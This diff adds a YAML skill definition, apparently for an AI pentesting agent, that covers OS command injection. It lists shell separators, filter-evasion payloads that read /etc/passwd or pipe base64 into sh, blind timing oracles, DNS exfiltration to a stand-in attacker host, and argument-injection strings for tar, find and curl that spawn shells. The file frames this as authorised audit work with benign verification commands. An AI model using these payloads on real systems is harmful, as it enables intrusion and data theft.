@@ -1,0 +1,77 @@
+schema_version: 1
+version: 3.0.0
+name: command-injection
+description: Senior command injection and shell evasion engineering — blind timing oracles, character/space filter bypass, argument injection, and subshell substitution.
+triggers:
+  - command injection
+  - rce
+  - shell injection
+  - argument injection
+  - blind rce
+  - filter bypass
+  - subshell
+  - ifs
+tools:
+  - curl
+knowledge: |
+  Audit operating system command injection vulnerabilities and shell filter evasion with principal systems engineering rigor.
+
+  1. INJECTION MECHANICS & SEPARATORS:
+     Identify entry points where untrusted user input is passed directly to system shells (`sh -c`, `bash -c`, `system()`, `popen()`, `exec()`, `Runtime.getRuntime().exec()`):
+     - POSIX Shell Command Separators:
+       `;` (sequential execution)
+       `&` (background execution)
+       `&&` (conditional success)
+       `||` (conditional failure)
+       `|` (pipe standard output)
+       `%0a` or `\n` (newline character execution)
+     - Subshell & Command Substitution:
+       `$(command)` (modern POSIX command substitution)
+       `` `command` `` (legacy backtick evaluation)
+       `<(command)` (process substitution in bash/zsh)
+
+  2. CHARACTER & SPACE FILTER EVASION:
+     When web application firewalls (WAF) or input sanitizers filter spaces or specific keywords:
+     - Space Filtering Bypass:
+       • Environment variable IFS: `${IFS}`, `$IFS$9` (e.g., `cat${IFS}/etc/passwd`)
+       • Brace expansion: `{cat,/etc/passwd}`
+       • Input redirection: `cat</etc/passwd`
+       • Quoted variable evaluation: `X=$'whoami';$X`
+     - Keyword / Binary Blacklist Evasion:
+       • Quoting concatenation: `c'a't /etc/passwd` or `c"a"t /etc/passwd`
+       • Backslash insertion: `c\at /etc/passwd`
+       • Glob / Wildcard matching: `/bin/c?t /etc/passwd` or `/usr/bin/p*ng 127.0.0.1`
+       • Variable assembly: `a=w; b=hoami; $a$b`
+       • Base64 decoding pipelines: `echo d2hvYW1p | base64 -d | sh`
+       • Octal / Hexadecimal encoding: `$(printf '\x77\x68\x6f\x61\x6d\x69')`
+
+  3. BLIND COMMAND INJECTION ORACLES:
+     When standard output and standard error are discarded or not returned in the HTTP response:
+     - Time-Based Latency Oracles:
+       Inject time delays and measure differential response duration:
+       `target_param=val;sleep 10`
+       `target_param=val$(sleep 10)`
+       `target_param=val` -> 200 ms latency vs `target_param=val;sleep 10` -> 10,200 ms latency confirms injection.
+     - Out-of-Band (OOB) DNS / Network Probing:
+       If egress networking permits DNS resolution:
+       `target_param=val;nslookup $(whoami).attacker.internal`
+       `target_param=val|ping -c 3 attacker.internal`
+
+  4. ARGUMENT INJECTION & PARAMETER HIJACKING:
+     When arguments are passed to binaries without a shell wrapper (`execve(["tar", "cf", "archive.tar", user_input])`), shell metacharacters do not execute, but argument injection occurs:
+     - `tar` Argument Injection:
+       `--checkpoint=1 --checkpoint-action=exec=sh script.sh`
+     - `curl` / `wget` Argument Injection:
+       Injecting `-o /destination/path` to overwrite files or `-d @file` to read sensitive data.
+     - `find` Argument Injection:
+       Injecting `-exec /bin/sh -c 'id' \;`
+
+  5. VERIFICATION STANDARDS & SAFETY:
+     - Use strictly benign discovery commands for verification: `id`, `uname -a`, `whoami`, `hostname`, `expr 1337 + 1`.
+     - Never issue destructive commands (`rm -rf`, system reboots, disk formatting).
+     - Document the injection vector, shell context, bypass payload, and verified output.
+references:
+  - persona:command-injection-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/command-injection.yaml
